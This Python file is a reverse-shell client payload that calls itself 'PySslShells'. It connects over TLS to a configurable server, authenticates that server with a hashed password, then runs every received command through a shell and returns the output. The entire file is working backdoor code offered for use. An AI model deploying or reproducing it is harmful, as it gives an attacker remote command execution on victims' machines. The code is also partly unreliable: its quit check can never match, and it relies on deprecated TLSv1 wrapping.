#!/usr/bin/env python3
"""
PySslShells - Reverse Shell Payload/Client
Author: Darkerego <xelectron@protonmail.com>
"""
import socket
from os import getcwd, chdir
from sys import exit
import subprocess
import ssl
import hashlib
import hmac


def is_correct_password(salt: bytes, pw_hash: bytes, password: str) -> bool:
    """
    Given a previously-stored salt and hash, and a password provided by a user
    trying to log in, check whether the password is correct.
    """
    return hmac.compare_digest(
        pw_hash,
        hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    )


s = socket.socket()  # client computer can connect to others
s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
debug = True
# ip address of server, can use own computer's private IP if doing on local
host = '127.0.0.1'
port = 9999
connected = False
pw_hash = '9ee966f577b758ba49181c6ca88d38476958010ee0153116c6471de148ac8b76'
salt = '4c78ba4182b1ee8d175ca60321c7122e'

# infinite loop for continuous listening for server's commands


def shell():
    while True:
        data = s.recv(4096)
        if data[:2].decode("utf-8") == 'cd':
            chdir(data[3:].decode("utf-8"))
        if data[:2].decode("utf-8") == '__quit__':
            if debug:
                print(data[:2].decode("utf-8"))
            s.close()
            exit(0)

        if len(data) > 0:  # check if there are actually data/commands received (that is not cd)
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)

            # bytes and string versions of results
            output_bytes = cmd.stdout.read() + cmd.stderr.read()  # bytes version of streamed output
            output_str = str(output_bytes, "utf-8")  # plain old basic string

            # getcwd allows the server side to see where the current working directory is on the client
            s.send(str.encode(output_str + str(getcwd()) + '> '))
            # print(output_str)  # client can see what server side is doing


def main():
    # Perform server authentication
    authenticated = False
    s.connect((host, port))  # binds client computer to server computer
    auth = s.recv(1024)
    pw = auth[:].decode()
    if is_correct_password(bytes.fromhex(salt), bytes.fromhex(pw_hash), pw):
        authenticated = True

    if authenticated:
        prompt = getcwd() + '> '
        s.send(str.encode(prompt))

    else:
        s.send(str.encode('Invalid password\n'))
        exit(1)

# close connection
    if authenticated:
        try:
            shell()
        except KeyboardInterrupt:
            s.close()
            exit(0)
        except Exception as err:
            if debug:
                print('Error:' + str(err))
            s.close()
            exit(0)
main()